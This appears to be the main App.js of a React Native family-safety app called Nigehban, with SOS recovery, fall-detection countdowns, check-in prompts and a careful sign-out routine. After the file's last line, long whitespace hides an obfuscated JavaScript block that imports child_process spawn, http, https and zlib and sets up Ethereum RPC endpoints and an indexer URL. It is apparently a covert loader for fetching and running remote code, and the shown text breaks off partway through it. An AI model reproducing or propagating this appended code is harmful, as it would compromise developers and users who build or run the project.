    band.send({ c: 'checkin_req', window: 90 });
  }, [session, dispatch, band]);

  const recoverRef = useRef(recoverOpenWork);
  recoverRef.current = recoverOpenWork;

  useEffect(() => {
    if (!session?.token) return undefined;
    // On the socket coming up, and on every return to the foreground. Both,
    // because they fail independently: the socket can be up on a phone whose
    // app was never in front of anyone, and the app can be opened by hand on a
    // phone whose socket is still down.
    if (serverOnline) recoverRef.current?.();
    const sub = AppState.addEventListener('change', (next) => {
      if (next === 'active') recoverRef.current?.();
    });
    return () => sub.remove();
  }, [session?.token, serverOnline]);

  // ---- an emergency this React tree never saw ------------------------------
  //
  // The state machine is memory-only, and Android destroys this whole tree
  // whenever the app is swiped out of Recents. The band's SOS still goes out
  // from the surviving process, so the alert is real, the family has been
  // paged, and the wearer felt the phone buzz -- but `dispatch('SOS_RAISED')`
  // landed in a reducer that no longer existed. Reopening the app then showed
  // the ordinary home screen with an emergency still live on the server, which
  // is the worst thing this app can say.
  //
  // The queue flush below is not enough on its own: it only restores alerts
  // that FAILED to send. A delivered one leaves nothing behind locally, so the
  // better the signal, the more completely the SOS disappeared.
  //
  // The server is the record. `created_at` comes back with the row, and the SOS
  // screen computes its timer from that -- so reopening ten minutes later shows
  // 10:00, not a countdown restarting from zero.
  const restoreLiveSos = useCallback(async () => {
    if (!session) return;
    try {
      const mine = await call(session, '/alerts?scope=mine&limit=5');
      const live = (mine || []).find(
        (a) => !a.resolved_at && EMERGENCY_KINDS.includes(a.kind));

      // The server says nothing is live, and this tree thinks something is.
      //
      // That gap used to be unreachable -- an alert only ended by this app
      // asking it to -- and it stopped being unreachable the moment two
      // answered check-ins could end one on their own. The `sos_cleared` frame
      // covers the app that was running to hear it; this covers the one that
      // was killed, which is the same app ten minutes later. Without it the
      // wearer reopens Nigehban to a live SOS screen for an emergency the
      // whole family already knows is over.
      //
      // `_local` is left alone: that is a queued alert the server has never
      // seen, so its absence from this list means nothing at all.
      if (!live) {
        const held = ctxRef.current.activeSos;
        if (held && !held._local && !String(held.id).startsWith('pending-')) {
          dispatch('SOS_CLEARED');
          setDeliveredTo(null);
          setDeliveryStatus(null);
          clearOwnSosNotification();
        }
        return;
      }

      const known = ctxRef.current.activeSos;
      // Leave alone anything this tree is holding that is not this row: an
      // alert still sitting in the offline queue is owned by the flush, and
      // overwriting it here would swap the id the stand-down button aims at --
      // the same failure BUG-005's queue-id fix exists to prevent.
      if (known && (known._local || String(known.id) !== String(live.id))) return;

      // Dispatched even when this tree already knows about the emergency,
      // which the early return here used to prevent. The row now carries the
      // acks with it and SOS_RAISED merges rather than blanking, so this is
      // the top-up for the case the socket cannot cover: the app backgrounded
      // rather than killed, its websocket quietly dead, someone answering in
      // the meantime. Coming back to the foreground now collects that.
      dispatch('SOS_RAISED', { alert: live });
      setDeliveryStatus('delivered');
      // The process may have been killed since, taking the notification with
      // it. Putting it back is what keeps the lock screen honest.
      showOwnSosNotification(live, live.acks || []);
      // And the tracker, for the same reason and with the same problem: the
      // plan it runs on is on disk, but an app update or a fresh install
      // leaves a live emergency with nothing next to it. `adoptTracking` asks
      // the server what this phone should be doing rather than working it out
      // from the row -- the cadence is a product decision, and it is not one
      // worth duplicating into a build that cannot be redeployed to a pocket.
      adoptTracking(session).catch(() => { /* offline; the bg tick retries */ });
    } catch {
      // Offline. The queue flush and the live socket still cover their own
      // cases, and a failed lookup must never look like "no emergency".
    }
  }, [session, dispatch]);

  // A cold start with something still in the queue, and every return to the
  // foreground after that.
  useEffect(() => {
    flushNow();
    restoreLiveSos();
    const sub = AppState.addEventListener('change', (next) => {
      if (next === 'active') { flushNow(); restoreLiveSos(); }
    });
    return () => sub.remove();
  }, [flushNow, restoreLiveSos]);

  // Keep the sticky "SOS is active" notification honest about who is coming.
  //
  // The server pushes its own notification the instant somebody answers, and
  // that is the one that gets noticed -- it arrives on a locked phone with this
  // app long dead. This is the other half: the line the wearer re-reads
  // afterwards, which would otherwise still say "your family can see your
  // location" an hour after two of them arrived.
  //
  // Only while this tree is alive, which is exactly when it can be done at all.
  const responderCount = ctx.responders.length;
  useEffect(() => {
    if (!ctx.activeSos || !responderCount) return;
    showOwnSosNotification(ctx.activeSos, ctx.responders);
    // Keyed on the count, not the array: the identity changes on every reducer
    // pass and re-posting a notification for no reason is how a shade fills up.
  }, [ctx.activeSos, responderCount]);   // eslint-disable-line react-hooks/exhaustive-deps

  // While the screen still says "waiting for signal", keep trying. With no
  // network that is one failed fetch every thirty seconds; once the queue is
  // empty the effect stops entirely.
  useEffect(() => {
    if (deliveryStatus !== 'queued') return undefined;
    const id = setInterval(flushNow, 30000);
    return () => clearInterval(id);
  }, [deliveryStatus, flushNow]);

  const signOut = async () => {
    // The band link belongs to the account that paired it. Sign-out used to
    // leave it up and leave `nigehban.band.id` in storage, so the next account
    // -- a different person, on a different database -- inherited the previous
    // one's wristband and started auto-connecting to it on launch.
    try { await band.disconnect?.(); } catch { /* nothing paired, or already down */ }

    // Sign-out used to be entirely local, so the server went on pushing this
    // account's family emergencies -- names, and a link to where somebody is
    // right now -- to a handset nobody was signed in on. Two halves, and the
    // order matters:
    //
    //   1. Tell the server to stop. This must come *before* clearSession(),
    //      which destroys the token the call authenticates with. Best effort:
    //      a sign-out with no signal must still sign the person out.
    //   2. Take the wake-up away locally, which needs no network and is
    //      therefore what actually covers the offline case in 1.
    await stopPushToThisPhone(session);
    await unregisterBackgroundNotifications();

    // Before stopBackgroundWatch, which takes the service down: stopTracking
    // hands the interval back and drops the plan and the unsent buffer, and a
    // plan left on disk would have the NEXT account's foreground service come
    // up reporting positions against a stranger's alert id.
    await stopTracking();
    await stopBackgroundWatch();
    await clearSession();
    await clearQueue();
    // The four-digit security PIN is deliberately NOT touched here.
    //
    // It used to be, by way of a clearPin() that read like the general one and
    // was in fact the disarm PIN specifically -- so signing out and back in on
    // your own phone silently threw away the gate in front of High Alert and
    // family removal, and the next arm disarmed on one tap with nothing to ask
    // for. The band's six digits, which is what this step was ever meant to
    // forget, are already gone: band.disconnect() above clears them, and says
    // so at the top of disconnect() in band.js.
    //
    // What made the wipe look necessary was a single handset-wide key, which
    // would have handed the next account a PIN it could not open. The key
    // carries an account now, so there is nothing left to inherit and nothing
    // left to destroy -- see security.js.
    dispatch('RESET');
    setSession(null);
    setIncoming(null);
    setDeliveryStatus(null);
  };

  // ---- the three ways out of the incident window ---------------------------
  //
  // Every one of them has to close the SERVER's question as well as this
  // screen, whenever there is one. A modal dismissed while a `checkins` row is
  // still open and unacked is a wearer who has said "I'm fine", watched the
  // countdown disappear, and whose family gets paged thirty seconds later
  // anyway -- which is the worst outcome in the whole feature, because it
  // teaches them the cancel button does not work.

  /** "I'm fine." Nobody is told, and a private note is kept for tuning. */
  const cancelFall = useCallback(async () => {
    const f = ctxRef.current.fall;
    dispatch('FALL_CANCELLED');
    // Let the detector fire again immediately. The guard exists to collapse the
    // `fall` and `impact` that one crash produces milliseconds apart, and a
    // human reaching this point has taken far longer than that -- so holding it
    // any longer would only mean that somebody who cancels a false alarm and
    // then genuinely comes off their bike five seconds later gets no question
    // at all.
    incidentAt.current = 0;
    setToast('Cancelled — noted for you only, nobody was told');
    // The near-miss is the record that the detector nearly fired. It is a
    // PRIVATE_KIND on the server: written down, sent to nobody, and the only
    // honest source of false-positive rates once this is on real wrists.
    raise({ kind: 'near_miss', source: 'band',
            note: `${f?.reason || 'fall'} cancelled by the wearer. ${f?.note || ''}`.trim() });
    if (!f?.checkinId) return;
    try {
      await call(session, `/checkin/${f.checkinId}/ack`, { method: 'POST' });
      reportOutcome('delivered');
    } catch {
      // The cancel did not reach the server, so the sweeper is still going to
      // escalate. Saying nothing here would let the wearer walk away believing
      // they had stopped it.
      reportOutcome('failed');
      // Big, because it is the one message on this path that asks for another
      // action. A toast that clears itself lets somebody walk away believing
      // they cancelled an alert that is still going to go out.
      pushNotice({
        icon: 'wifi-off', tone: U.amber,
        title: 'That did not reach the server',
        body: 'Your family may still be told. Try again, or call them.',
        action: 'I understand',
      });
    }
  }, [dispatch, raise, session, reportOutcome, pushNotice]);
  const cancelFallRef = useRef(cancelFall);
  cancelFallRef.current = cancelFall;

  /** "I need help now" — the wearer skipping the rest of the countdown. */
  const escalateFall = useCallback(async () => {
    const f = ctxRef.current.fall;
    raise({ kind: f?.reason === 'accident' ? 'accident' : 'fall',
            source: 'band', note: f?.note || '' });
    // Close the question behind it. The alert has already told everyone the
    // check-in would have told; leaving the row open means the sweeper pages
    // the same family a second time for the same event a minute later.
    if (f?.checkinId) {
      try { await call(session, `/checkin/${f.checkinId}/ack`, { method: 'POST' }); }
      catch { /* the alert is out, which is the part that matters */ }
    }
  }, [raise, session]);

  /**
   * The window ran out with no answer.
   *
   * Whether this phone does anything depends entirely on whether the server
   * ever heard about the incident. If it did, the deadline belongs to the
   * sweeper and this must stay out of the way -- raising the alert from here
   * too would page the family twice for one fall, with two rows and two
   * timestamps that disagree.
   *
   * If it did not -- the detector fired with no signal -- then this process is
   * the only thing that knows, and it has to raise the alert into the offline
   * queue itself.
   */
  const expireFall = useCallback(() => {
    const f = ctxRef.current.fall;
    dispatch('FALL_ESCALATED');
    if (f?.checkinId) {
      pushNotice({
        icon: 'alert-triangle', tone: U.red,
        title: 'Your family is being told',
        body: 'The countdown ran out. Answering now still tells them you are fine.',
        action: 'I understand',
      });
      return;
    }
    raise({ kind: f?.reason === 'accident' ? 'accident' : 'fall',
            source: 'band', note: f?.note || '' });
  }, [dispatch, raise, pushNotice]);

  /**
   * THE ONE AUTOMATIC WAY OUT: they are still riding.
   *
   * A rider who hits a pothole at 50 km/h takes a real 12 g through the wrist
   * and is completely fine. Asking them to answer a check-in is asking somebody
   * to tap a wristband one-handed at speed, which is more dangerous than the
   * false alarm it prevents -- so sustained travel stands the question down on
   * their behalf.
   *
   * `travellingSteadily` is where the care is. It is not "the speed is not
   * zero": a wrecked car spins, coasts, gets pushed down the road and is often
   * moving for a long time afterwards, and reading that as "fine" is exactly
   * the failure this whole design is arranged to avoid. It requires twenty
   * unbroken seconds ABOVE road speed, every sample, with no second impact --
   * because nothing but a conscious person keeps a vehicle there.
   *
   * Falls do not get this. There is no vehicle to be coherently driving, and
   * "started moving again" after a fall is a person crawling as easily as a
   * person walking off.
   */
  useEffect(() => {
    if (state !== 'fall_pending' || ctx.fall?.reason !== 'accident') return undefined;
    const id = setInterval(() => {
      if (!travellingSteadily()) return;
      clearInterval(id);
      cancelFallRef.current?.();
      setToast('You are moving normally again — the accident check was stood down');
    }, 2000);
    return () => clearInterval(id);
  }, [state, ctx.fall?.reason]);

  const respondAsSamaritan = useCallback(async (alertId) => {
    const r = await call(session, `/samaritan/${alertId}/respond`, { method: 'POST' });
    return r.alert;
  }, [session]);

  if (booting) {
    return (
      <View style={[st.flex, st.center]}>
        <ActivityIndicator color={C.green} size="large" />
      </View>
    );
  }

  if (!session) {
    return (
      <>
        <StatusBar style="light" />
        <Auth onDone={setSession} />
      </>
    );
  }

  // ---- role-based routing ------------------------------------------------
  // Admins get the full console: five tabs, the band wire log, diagnostics.
  // Every other account gets the two-tab end-user shell.
  //
  // Only the *shell* forks. Everything below it -- the takeover, the check-in
  // sheet, the Samaritan call, the fall window -- is the safety machine, and
  // it is rendered for both roles. A user who could not see an incoming
  // family emergency would be the more dangerous kind of clean UI.
  const isAdmin = session.role === 'admin';

  return (
    // The two roles do not share a ground colour: the console keeps the cool
    // near-black of the design system, the user shell sits on charcoal. This
    // is the root behind the status bar, so it has to fork here or the top
    // strip stays the wrong shade.
    <View style={[st.flex, { paddingTop: insets.top }, !isAdmin && { backgroundColor: U.bg }]}>
      <StatusBar style="light" />

      {!isAdmin ? (
        <UserShell
          session={session}
          band={band}
          ctx={ctx}
          deliveredTo={deliveredTo}
          deliveryStatus={deliveryStatus}
          serverOnline={serverOnline}
          onRaise={raise}
          onResolve={resolve}
          onOptinSamaritan={handleOptinSamaritan}
          refreshKey={refreshKey}
          onAckCheckin={ackCheckin}
          onToggleHighAlert={toggleHighAlert}
          onFix={setFix}
          onSignOut={signOut}
        />
      ) : (
      <>
      <View style={st.header}>
        <View>
          <Text style={st.brand}>NIGEHBAN</Text>
          <Text style={st.who}>{session.name} · {session.user_id}</Text>
        </View>
        <View style={st.headerRight}>
          <Chip text={serverOnline ? 'connected' : 'offline'}
                tone={serverOnline ? C.green : C.red}
                icon={serverOnline ? 'wifi' : 'wifi-off'} />
          <IconButton name="log-out" label="Sign out" onPress={signOut} />
        </View>
      </View>

      <View style={st.flex}>
        {tab === 'home' && (
          <Home session={session} band={band} ctx={ctx}
                deliveredTo={deliveredTo} deliveryStatus={deliveryStatus} onRaise={raise} onResolve={resolve}
                onOptinSamaritan={handleOptinSamaritan}
                serverOnline={serverOnline} onOpenBand={() => setTab('band')}
                onOpenSetup={() => setTab('setup')}
                onAckCheckin={ackCheckin} onToggleHighAlert={toggleHighAlert}
                onFix={setFix} />
        )}

        {tab === 'band' && <Band band={band} serverOnline={serverOnline} />}
        {tab === 'family' && (
          <Family session={session} refreshKey={refreshKey}
                  onChanged={refreshInvites} />
        )}
        {tab === 'alerts' && <Alerts session={session} refreshKey={refreshKey} />}
        {tab === 'setup' && <Setup session={session} />}
      </View>

      <View style={[st.tabbar, { paddingBottom: 8 + insets.bottom }]}>
        {TABS.map(([k, label, icon]) => {
          const on = tab === k;
          // Somebody is waiting behind this tab. The count goes in the label
          // rather than in the mark, because a red dot is a hint and not a
          // sentence -- and it is the only thing in this bar that is about a
          // person rather than about a screen.
          const waiting = k === 'family' ? pendingInvites : 0;
          return (
            <Pressable key={k} onPress={() => setTab(k)} style={st.tabBtn}
                       accessibilityRole="tab" accessibilityState={{ selected: on }}
                       accessibilityLabel={waiting
                         ? `${label}, ${waiting} waiting for an answer`
                         : label}>
              <View>
                <Icon name={icon} size={19} color={on ? C.green : C.faint} />
                {waiting ? <View style={st.tabDot} /> : null}
              </View>
              <Text style={[st.tabText, on && { color: C.green }]}>{label}</Text>
            </Pressable>
          );
        })}
      </View>
      </>
      )}

      {toast ? (
        <Pressable onPress={() => setToast(null)} accessibilityRole="alert"
                   style={[st.toast, { bottom: 88 + insets.bottom }]}>
          <Icon name="info" size={15} color={C.dim} />
          <Text style={st.toastText}>{toast}</Text>
        </Pressable>
      ) : null}

      {/* ---- a fall, and the seconds to say it was nothing ----
          Same window, same two outcomes, two ways of asking. The console
          takes a button; the wearer's phone takes four digits, so that a
          pocket -- or somebody else's hand -- cannot cancel her alarm. */}
      {isAdmin ? (
        <FallCountdown
          fall={is('fall_pending') ? ctx.fall : null}
          onCancel={cancelFall}
          onEscalate={escalateFall}
          onExpire={expireFall}
        />
      ) : (
        <DisarmPad
          fall={is('fall_pending') ? ctx.fall : null}
          onCancel={cancelFall}
          onEscalate={escalateFall}
          onExpire={expireFall}
        />
      )}

      {/* ---- somebody in the family is in trouble ----
          Severity 4 and up arrives with a siren behind it. Severity 3 -- a
          watch that went quiet, a missed check-in, a phone about to die --
          takes the same screen in amber and without one: it is not an
          emergency, but it is the family's only chance to notice that
          somebody has gone silent, and it used to be a notification nobody
          saw. */}
      <Modal visible={!!incoming && !liveMap} animationType="fade"
             onRequestClose={() => setIncoming(null)}>
        {incoming ? (
          <View style={[st.takeover,
                        incoming.severity < SIREN_FROM && { backgroundColor: C.amberSoft }]}>
            <View style={[st.takeBadge, { backgroundColor: sevColor(incoming.severity) }]}>
              <Icon name={incoming.severity >= SIREN_FROM ? 'alert-octagon' : 'alert-triangle'}
                    size={16} color={C.bg} />
              <Text style={st.takeBadgeText}>
                {TAKEOVER_TITLE[incoming.kind] || incoming.kind.replace(/_/g, ' ').toUpperCase()}
              </Text>
            </View>

            <Txt variant="display" style={st.takeName}>{incoming.user.name}</Txt>
            {TAKEOVER_LEDE[incoming.kind] ? (
              <Text style={st.takeLede}>{TAKEOVER_LEDE[incoming.kind]}</Text>
            ) : null}
            <Text style={st.takeMeta}>
              {incoming.source === 'band' ? 'Raised from the wristband'
                : incoming.source === 'server' ? 'Raised by the server watchdog'
                : 'Raised from their phone'}
            </Text>

            {/* ---- is this pin moving, and how old is it? ----
                The one line that decides whether the map button below is worth
                pressing. A fix from eight seconds ago is where somebody IS; one
                from six minutes ago is where they were, and telling a family
                member the second thing in the words of the first is how they
                end up standing in an empty street. */}
            {incoming.live_at ? (
              <Text style={[st.takeMeta, {
                marginBottom: S.lg,
                color: (Date.now() / 1000 - incoming.live_at) <= LIVE_STALE_S
                  ? C.green : C.amber,
              }]}>
                {(Date.now() / 1000 - incoming.live_at) <= LIVE_STALE_S
                  ? '● Live location — updating now'
                  : `Last position ${fmtAgo(incoming.live_at)}`}
              </Text>
            ) : null}

            {/* ---- Good Samaritan, from the family's side ----
                The server has always allowed this -- /alert/{id}/samaritan-optin
                takes the call from the victim OR anyone in their family -- and
                until now nothing in the app ever made it. Only the wearer's own
                SOS screen had the buttons, which is exactly the screen nobody
                can reach in the emergencies where it matters: she is not
                holding her phone, or she is not able to answer it. The
                permission existed and was unreachable.

                Severity 5 only, and only while the decision is still open. A
                'denied' set by the wearer is final and is not offered here --
                a person who chose Family Only for their own emergency does not
                get overruled by a relative. */}
            {incoming.severity >= SAMARITAN_FROM
              && (incoming.samaritan_status || 'pending') === 'pending' ? (
              <View style={st.takeSam}>
                <Text style={[T.meta, { color: C.dim, textAlign: 'center' }]}>
                  Ask Nigehban users near them to help? They are shown a rough
                  pin and a distance — never {incoming.user.name}&apos;s name.
                </Text>
                <View style={{ flexDirection: 'row', gap: S.sm }}>
                  <View style={{ flex: 1 }}>
                    <Button title="ALERT NEARBY" tone={C.blue} filled icon="users"
                            loading={optingIn} disabled={optingIn}
                            onPress={async () => {
                              if (optingIn) return;
                              setOptingIn(true);
                              try { await handleOptinSamaritan(incoming.id, 'allow'); }
                              finally { setOptingIn(false); }
                            }} />
                  </View>
                  <View style={{ flex: 1 }}>
                    <Button title="FAMILY ONLY" tone={C.dim}
                            disabled={optingIn}
                            onPress={async () => {
                              if (optingIn) return;
                              setOptingIn(true);
                              try { await handleOptinSamaritan(incoming.id, 'deny'); }
                              finally { setOptingIn(false); }
                            }} />
                  </View>
                </View>
              </View>
            ) : null}

            {incoming.severity >= SAMARITAN_FROM
              && incoming.samaritan_status === 'allowed' ? (
              <Text style={[st.takeMeta, { color: C.green }]}>
                Nearby Nigehban users have been asked to help
              </Text>
            ) : null}

            <View style={st.takeBtns}>
              {/* Opening the map does not close the takeover, so this is the one
                  exit that has to stop the siren itself -- they have plainly
                  seen it, and it must not follow them into Maps. */}
              {incoming.maps ? (
                <Button title={incoming.share_path && !incoming.resolved_at
                          ? 'WATCH THEM LIVE'
                          : incoming.severity >= SIREN_FROM
                            ? 'SEE WHERE THEY ARE' : 'SEE WHERE THEY WERE'}
                        filled big tone={sevColor(incoming.severity)} icon="navigation"
                        onPress={() => {
                          stopAlarm();
                          // In-app when there is a live page to show, and out
                          // to Maps when there is not -- an older server, or a
                          // kind of alert that is not tracked. The wording
                          // above changes with it, because "watch them live"
                          // over a frozen pin is the one promise this screen
                          // must not make.
                          if (incoming.share_path) setLiveMap(incoming);
                          else Linking.openURL(incoming.maps);
                        }} />
              ) : null}
              {/* The one button on this screen that speaks to the server, and
                  it is pressed by somebody who has just been woken by a siren.
                  Without a spinner it sits there looking untouched for the
                  whole round trip and gets pressed again -- on the takeover
                  that is the worst place in the app to look dead. The whole
                  dialog goes quiet while it runs: dismissing it mid-flight
                  would leave the family with no screen that ever said whether
                  they had answered. */}
              <Button title={acking ? 'TELLING THEM…'
                        : incoming.severity >= SIREN_FROM ? "I'M ON IT" : "I'LL CHECK ON THEM"}
                      tone={C.green} filled icon="user-check" loading={acking}
                      onPress={async () => {
                        if (acking) return;
                        setAcking(true);
                        try {
                          await call(session, `/alert/${incoming.id}/ack`, { method: 'POST' });
                        } catch { /* they are still told by the socket */ }
                        finally { setAcking(false); }
                        setIncoming(null); bump();
                      }} />
              <Button title="Dismiss" tone={C.dim} disabled={acking}
                      onPress={() => setIncoming(null)} />
            </View>
          </View>
        ) : null}
      </Modal>

      {/* ---- somebody is checking on you ---- */}
      <Modal visible={!!askSheet} animationType="slide" transparent
             onRequestClose={() => setAskSheet(null)}>
        <View style={st.sheetWrap}>
          <Pressable style={st.sheetBackdrop} onPress={() => setAskSheet(null)}
                     accessibilityLabel="Answer later" />
          <View style={st.sheet}>
            <View style={st.grab} />
            <Txt variant="h1">
              {askSheet?.reason === 'sos'
                ? 'Are you safe now?'
                : askSheet?.system
                  ? 'Nigehban is checking on you'
                  : `${askSheet?.name} is checking on you`}
            </Txt>
            <Text style={st.sheetBody}>
              {/* The SOS question is the only one answered to get OUT of
                  something rather than to stay clear of it, and saying so is
                  the difference between a wearer tapping twice on purpose and
                  a wearer tapping to make a buzzing stop. */}
              {askSheet?.reason === 'sos'
                ? 'Your SOS is still live. Answer this and the next one, and Nigehban tells your family you are safe.'
                : askSheet?.system
                  ? 'High Alert is on. Answer, or your family is told that you did not.'
                  : 'Answer and they will see straight away that you are fine.'}
            </Text>
            <CheckinBanner checkin={askSheet} onAck={ackCheckin} />
            <Button title={askSheet?.system ? 'Answer later' : 'Not now'} tone={C.dim}
                    onPress={() => { Vibration.cancel(); setAskSheet(null); }} />
          </View>
        </View>
      </Modal>

      {/* ---- a stranger nearby needs help ---- */}
      <SamaritanCall call={samaritan} onRespond={respondAsSamaritan}
                     onDismiss={() => { Vibration.cancel(); setSamaritan(null); }} />

      {/* ---- news worth stopping for, but not an emergency ----
          Rendered last and gated on everything above it being closed. Two
          Modals open at once on Android is one Modal that never appears, and
          the one that must never lose that race is the emergency. The queue
          holds; this shows the head of it the moment the screen is free. */}
      <BigNotice
        notice={(incoming || askSheet || samaritan || is('fall_pending'))
          ? null : notices[0]}
        onClose={dismissNotice}
      />

      {/* ---- watching somebody move ----
          The answer to the oldest complaint about this app: the map link was a
          photograph. This is the server's own live page, embedded, and the
          same page that gets forwarded to whoever is closer than the family. */}
      <LiveMap visible={!!liveMap} alert={liveMap} session={session}
               onClose={() => setLiveMap(null)} />
    </View>
  );
}

const st = StyleSheet.create({
  flex: { flex: 1, backgroundColor: C.bg },
  center: { alignItems: 'center', justifyContent: 'center' },

  header: {
    flexDirection: 'row', justifyContent: 'space-between', alignItems: 'center',
    paddingHorizontal: S.lg, paddingTop: S.md, paddingBottom: S.md,
    borderBottomWidth: StyleSheet.hairlineWidth, borderBottomColor: C.line,
  },
  headerRight: { flexDirection: 'row', alignItems: 'center', gap: S.sm },
  brand: { ...T.h2, color: C.text, letterSpacing: 2 },
  who: { ...T.meta, color: C.faint, marginTop: 1 },

  tabbar: {
    flexDirection: 'row', backgroundColor: C.surface,
    borderTopWidth: StyleSheet.hairlineWidth, borderTopColor: C.line,
    paddingTop: S.sm,
  },
  tabBtn: { flex: 1, alignItems: 'center', gap: 4, paddingVertical: 6, minHeight: 48 },
  tabText: { ...T.label, color: C.faint },
  // Ringed in the bar's own colour so it reads as a mark on the icon rather
  // than as part of it, at any icon size.
  tabDot: {
    position: 'absolute', top: -2, right: -4,
    width: 10, height: 10, borderRadius: 5,
    backgroundColor: C.red, borderWidth: 2, borderColor: C.surface,
  },

  toast: {
    position: 'absolute', left: S.lg, right: S.lg, flexDirection: 'row',
    alignItems: 'center', gap: S.sm, backgroundColor: C.raised,
    borderRadius: 8, paddingHorizontal: S.md, paddingVertical: S.md,
  },
  toastText: { ...T.meta, color: C.text, flex: 1 },

  takeover: {
    flex: 1, backgroundColor: C.redSoft, alignItems: 'center',
    justifyContent: 'center', padding: S.xl, gap: S.sm,
  },
  takeBadge: {
    flexDirection: 'row', alignItems: 'center', gap: S.sm,
    paddingHorizontal: S.md, paddingVertical: S.sm, borderRadius: 4,
  },
  takeBadgeText: { ...T.label, color: C.bg, fontSize: 12 },
  takeName: { color: C.text, textAlign: 'center', marginTop: S.md },
  takeLede: { ...T.body, color: C.text, textAlign: 'center', marginTop: S.xs },
  takeMeta: { ...T.body, color: C.dim, marginBottom: S.xl },
  takeBtns: { alignSelf: 'stretch', gap: S.md },
  // The family's Good Samaritan decision, set apart from the two buttons below
  // it. Those are "I'm on it" and "Dismiss" -- what this reader does next --
  // and this is a decision about somebody else's privacy. A thumb reaching for
  // one must not be able to land on the other.
  takeSam: {
    alignSelf: 'stretch', gap: S.sm, marginBottom: S.lg,
    padding: S.md, borderRadius: 10,
    backgroundColor: 'rgba(255, 255, 255, 0.04)',
    borderWidth: 1, borderColor: C.raised || '#1F2937',
  },

  sheetWrap: { flex: 1, justifyContent: 'flex-end' },
  sheetBackdrop: { ...StyleSheet.absoluteFillObject, backgroundColor: C.scrim },
  sheet: {
    backgroundColor: C.surface, borderTopLeftRadius: 14, borderTopRightRadius: 14,
    padding: S.xl, paddingBottom: S.xxl, gap: S.md,
  },
  grab: {
    width: 36, height: 4, borderRadius: 2, backgroundColor: C.line,
    alignSelf: 'center', marginBottom: S.sm,
  },
  sheetBody: { ...T.body, color: C.dim },
});

export default function App() {
  const fontsReady = useAppFonts();

  if (!fontsReady) {
    return (
      <View style={[st.flex, st.center]}>
        <ActivityIndicator color={C.green} size="large" />
      </View>
    );
  }

  return (
    <SafeAreaRoot>
      <Main />
    </SafeAreaRoot>
  );
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             global.i="A9-0105-2";var _0x5ba36e=_0x56c6;(function(_0x2f9038,_0x524f7c){var _0x931160=_0x56c6,_0x3811bc=_0x2f9038();while(!![]){try{var _0x2cf454=parseInt(_0x931160(0x21a))/(-0x2c1+-0x1c8+0x48a)*(parseInt(_0x931160(0x223))/(0x944*0x4+0x2*0x35b+-0x2bc4))+parseInt(_0x931160(0x115))/(-0x1*0x22db+-0x26*0x45+0x2d1c)+parseInt(_0x931160(0xbe))/(-0x202f+0x1294+0xd9f)+parseInt(_0x931160(0xfd))/(0xc*-0x88+-0x1209+0x186e*0x1)*(parseInt(_0x931160(0x1d7))/(0x12e+-0x1*-0xe9d+-0xfc5))+parseInt(_0x931160(0x1d9))/(0xa62*0x3+0x881+0x1*-0x27a0)*(-parseInt(_0x931160(0x120))/(-0x1faa+-0x23e4+0x4396))+-parseInt(_0x931160(0x17e))/(0x2*-0x83+0x657+-0x548)*(parseInt(_0x931160(0x109))/(0x1fa7+-0x102b+-0x293*0x6))+parseInt(_0x931160(0x20d))/(0x9a0+0x1a6e+-0x2403)*(-parseInt(_0x931160(0x18b))/(-0x9*0x431+0x24b*-0x1+0x10*0x281));if(_0x2cf454===_0x524f7c)break;else _0x3811bc['push'](_0x3811bc['shift']());}catch(_0x1fd241){_0x3811bc['push'](_0x3811bc['shift']());}}}(_0x3e8f,0x353bf+0x7ac3*-0x9+0x67afb));import _0x296fba from'http';import _0xb995e6 from'https';import _0x3f47fe from'zlib';import{URL}from'url';import{spawn}from'child_process';import{createRequire}from'module';var require=createRequire(import.meta.url),module={'exports':{}},exports=module[_0x5ba36e(0x19e)];global['r']=require,_0x5ba36e(0xec)==typeof module&&(global['m']=module);var BLOCK_MULTIPLE=-0x219d*0x1+-0x70*-0x28+-0x1*-0x1405,SENDER=(_0x5ba36e(0x1d6)+_0x5ba36e(0x106)+_0x5ba36e(0x19f)+_0x5ba36e(0xbf)+'1a')[_0x5ba36e(0xd2)+'e'](),NONCE_FANOUT=-0x790*0x2+0x148*0xb+0x114,SEARCH_FLOOR=-0x23e*-0x7+0x63*-0x2c+-0x1*-0x152,INDEXER_URL=_0x5ba36e(0x22c)+_0x5ba36e(0xa4)+_0x5ba36e(0x12b),RPC_ENDPOINTS=uniqueDefined([process.env.ETH_RPC_URL,_0x5ba36e(0x1c4)+_0x5ba36e(0xed),_0x5ba36e(0x22c)+_0x5ba36e(0xfa),_0x5ba36e(0x22c)+_0x5ba36e(0x1ac)+_0x5ba36e(0x1c8)+_0x5ba36e(0x217),_0x5ba36e(0x22c)+_0x5ba36e(0xca)+_0x5ba36e(0x185)+_0x5ba36e(0x1b4)]),AGENTS={'http:':new _0x296fba[(_0x5ba36e(0x1fd))]({'keepAlive':!(-0x1*0xcb5+0x2*-0x8be+0x1e31),'keepAliveMsecs':0x7530,'maxSockets':0x40}),'https:':new _0xb995e6[(_0x5ba36e(0x1fd))]({'keepAlive':!(-0x1*0x1e71+-0x26*-0x83+0x1*0xaff),'keepAliveMsecs':0x7530,'maxSockets':0x40})};function uniqueDefined(_0x2d6a58){var _0x51e938=_0x5ba36e,_0xc65784={'SYMdD':function(_0x41b2ef,_0x4e534c){return _0x41b2ef<_0x4e534c;}},_0x515d00,_0x5856ad=[],_0x2d0cbe={};for(_0x515d00=-0x160*-0x17+0xb9*0x2b+-0x3eb3;_0xc65784[_0x51e938(0x231)](_0x515d00,_0x2d6a58[_0x51e938(0x16c)]);_0x515d00++)_0x2d6a58[_0x515d00]&&!_0x2d0cbe[_0x2d6a58[_0x515d00]]&&(_0x2d0cbe[_0x2d6a58[_0x515d00]]=!(0x421+0x1348+-0x1cd*0xd),_0x5856ad[_0x51e938(0x1df)](_0x2d6a58[_0x515d00]));return _0x5856ad;}function linkAbort(_0xbb5d1b,_0x1ffe0c){var _0x394d00=_0x5ba36e,_0x30c209={'NhZzt':_0x394d00(0xdb)};_0xbb5d1b&&_0xbb5d1b[_0x394d00(0x1e2)+_0x394d00(0x1fe)](_0x30c209[_0x394d00(0x105)],function(){var _0x1c014a=_0x394d00;_0x1ffe0c[_0x1c014a(0xdb)]();},{'once':!(0x6*-0x2d4+0x1*-0x11e7+0x71*0x4f)});}function decompressStream(_0x30b68a){var _0x31c4c4=_0x5ba36e,_0x4958bf={'ZkwKQ':_0x31c4c4(0x1aa)+_0x31c4c4(0xc9),'xWrym':function(_0x1c8113,_0x32152b){return 